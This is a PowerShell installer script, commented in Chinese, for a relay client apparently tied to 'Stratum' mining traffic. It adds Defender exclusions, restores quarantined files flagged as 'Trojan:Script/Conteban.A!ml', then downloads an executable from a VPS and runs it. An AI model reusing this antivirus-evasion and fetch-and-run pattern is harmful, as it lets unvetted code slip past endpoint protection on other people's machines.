# 木林森中转移守电脑初始化脚本主体
#
# 本文件是"单文件版"的脚本主体，由 build-setup.ps1 拼进 watch-pc-setup-<版本>.bat。
# 不要直接双击本文件（.ps1 双击会用记事本打开），请使用生成出来的 .bat。
#
# 行为：
#   * 下载这个 .bat 本身就走 VPS 的下载闸门（和安装包同一套机制）
#   * 运行后把安装包下载到 **本 .bat 所在的同一个目录**，并在这个目录里启动
#   * 结束时停在窗口里显示成功，按任意键才关闭；中转在关闭前启动
#
# 两条可用性要求（都踩过坑）：
#   * 任何失败都要在窗口里显示原因并停住 —— 否则提权窗口瞬间关闭，操作者以为成功了
#   * 启动后要确认进程还活着 —— "配置成功但没起来"必须能当场看出来

$ErrorActionPreference = 'Stop'
$ConfigDirectory  = Join-Path $env:LOCALAPPDATA 'StratumSecureRelay'
$GateBase         = 'https://status1.mulinsen.win/exe'
$ThreatName       = 'Trojan:Script/Conteban.A!ml'

function Write-Step([string]$Text) { Write-Host "==> $Text" -ForegroundColor Cyan }
function Write-Ok([string]$Text)   { Write-Host "    完成：$Text" -ForegroundColor Green }
function Write-Warn([string]$Text) { Write-Host "    注意：$Text" -ForegroundColor Yellow }

Write-Host ''
Write-Host '  木林森中转移守电脑初始化' -ForegroundColor White
Write-Host '  ----------------------------------------' -ForegroundColor DarkGray

# 安装目录 = 本 .bat 所在目录（批处理把自身路径放进 SELF）。目录不可写时退回 C:\MulinSenRelay
$installDirectory = 'C:\MulinSenRelay'
if ($env:SELF -and (Test-Path -LiteralPath $env:SELF)) {
    $candidate = Split-Path -Parent $env:SELF
    if ($candidate) {
        $probe = Join-Path $candidate ".write-test-$([guid]::NewGuid().ToString('N').Substring(0,6))"
        try {
            [System.IO.File]::WriteAllText($probe, 'x')
            Remove-Item -LiteralPath $probe -Force
            $installDirectory = $candidate
        } catch {
            Write-Warn "本目录不可写，改用 $installDirectory"
        }
    }
}
Write-Host "  安装位置：$installDirectory" -ForegroundColor Gray

try {
    # 1) 排除目录：必须在下载和运行之前完成，否则下载到就被删除
    Write-Step '把安装目录加入 Defender 排除'
    try {
        New-Item -ItemType Directory -Force -Path $installDirectory | Out-Null
        Add-MpPreference -ExclusionPath $installDirectory -ErrorAction Stop
        Write-Ok $installDirectory
    } catch {
        Write-Warn "无法写入 Defender 排除（$($_.Exception.Message)）"
        Write-Warn '如果这台机器装有第三方杀毒软件，请手动把该目录加入它的白名单。'
    }
    try {
        if (Test-Path $ConfigDirectory) {
            Add-MpPreference -ExclusionPath $ConfigDirectory -ErrorAction Stop
            Write-Ok $ConfigDirectory
        }
    } catch {
        Write-Warn "配置目录排除失败：$($_.Exception.Message)"
    }

    # 2) 尽力把之前被隔离的文件放回来
    Write-Step '尝试恢复之前被隔离的安装包'
    $mpCmd = Join-Path $env:ProgramFiles 'Windows Defender\MpCmdRun.exe'
    if (Test-Path $mpCmd) {
        try {
            & $mpCmd -Restore -Name $ThreatName -All 2>&1 | Out-Null
            Write-Ok '已请求恢复（若从未被隔离，此处没有实际动作）'
        } catch {
            Write-Warn "恢复请求失败：$($_.Exception.Message)"
        }
    } else {
        Write-Warn '找不到 MpCmdRun.exe，跳过恢复步骤'
    }

    # 3) 读取发布清单
    Write-Step '从 VPS 读取当前发布版本'
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $manifest = $null
    for ($attempt = 1; $attempt -le 2 -and -not $manifest; $attempt++) {
        try {
            $manifest = Invoke-RestMethod -Uri "$GateBase/manifest" -TimeoutSec 20 -UseBasicParsing
        } catch {
            if ($attempt -eq 2) {
                throw "读不到发布清单（$($_.Exception.Message)）。请检查这台机器能否访问 internet，或稍后重试。"
            }
            Start-Sleep -Seconds 2
        }
    }
    if (-not $manifest -or -not $manifest.version -or -not $manifest.file) {
        throw '发布清单内容不完整，请联系管理员检查 VPS 上的下载闸门。'
    }
    Write-Ok "最新版本 $($manifest.version)，$([math]::Round($manifest.size / 1KB)) KB"
    $target = Join-Path $installDirectory $manifest.file

    # 如果同目录已经是这个版本且校验一致，就不重复下载
    $needDownload = $true
    if (Test-Path -LiteralPath $target) {
        $existing = (Get-FileHash -LiteralPath $target -Algorithm SHA256).Hash.ToLowerInvariant()
        if ($existing -eq $manifest.sha256.ToLowerInvariant()) {
            Write-Ok '同目录已存在相同版本的安装包，跳过下载'
            $needDownload = $false
        }
    }

    if ($needDownload) {
        Write-Step "下载 $($manifest.file)"
        $downloaded = $false
        for ($attempt = 1; $attempt -le 2 -and -not $downloaded; $attempt++) {
            try {
                Invoke-WebRequest -Uri "$GateBase/$($manifest.file)" -OutFile $target -TimeoutSec 300 -UseBasicParsing
                $downloaded = $true
            } catch {
                $message = $_.Exception.Message
                if ($message -match '410' -or $message -match 'Gone' -or $message -match '下载闸门') {
                    throw "下载闸门当前未开放。请让管理员在管理面板「设置 → 版本与更新 → 客户端下载闸门」点开（建议用 10 分钟，可覆盖多台机器），然后再运行本工具。"
                }
                if ($attempt -eq 2) {
                    throw "下载失败（$message）。若长时间失败，可让管理员从 GitHub 发布页取安装包。"
                }
                Start-Sleep -Seconds 2
            }
        }

        Write-Step '校验安装包'
        if (-not (Test-Path -LiteralPath $target)) {
            throw "下载结束了但文件不存在：$target（可能被安全软件删除，请确认排除已生效）"
        }
        $actual = (Get-FileHash -LiteralPath $target -Algorithm SHA256).Hash.ToLowerInvariant()
        if ($actual -ne $manifest.sha256.ToLowerInvariant()) {
            Remove-Item -LiteralPath $target -Force -ErrorAction SilentlyContinue
            throw "摘要不一致，已删除下载的文件。期望 $($manifest.sha256)，实际 $actual"
        }
        Write-Ok "SHA-256 一致（$($actual.Substring(0,16))…）"
    }

    # 4) 启动并确认活着
    Write-Step '启动中转客户端'
    $running = Get-Process -Name '木林森*' -ErrorAction SilentlyContinue
    if ($running) {
        Write-Warn '检测到旧版本正在运行，先结束它'
        $running | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
    }
    Unblock-File -LiteralPath $target -ErrorAction SilentlyContinue
    $started = Start-Process -FilePath $target -WorkingDirectory $installDirectory -PassThru
    Start-Sleep -Seconds 6
    if ($started.HasExited) {
        Write-Host ''
        Write-Warn "客户端启动后立即退出了（退出码 $($started.ExitCode)）"
        Write-Warn '请手动双击下面这个文件，看它自己弹出的提示：'
        Write-Host "      $target" -ForegroundColor Gray
        throw '客户端没有正常启动，请按上面的路径手动运行一次排查。'
    }
    Write-Ok "中转客户端已启动（进程号 $($started.Id)）"

    Write-Host ''
    Write-Host '  初始化成功，中转已在运行。' -ForegroundColor Green
    Write-Host "  安装位置：$installDirectory" -ForegroundColor Gray
    Write-Host '  以后升级不需要再运行本工具。' -ForegroundColor Gray
} catch {
    Write-Host ''
    Write-Host '  初始化没有完成' -ForegroundColor Red
    Write-Host "  原因：$($_.Exception.Message)" -ForegroundColor Red
    Write-Host ''
    Write-Host '  修好后可以再次双击运行本工具，不会重复安装。' -ForegroundColor Yellow
} finally {
    Write-Host ''
    Read-Host '按任意键退出'
}
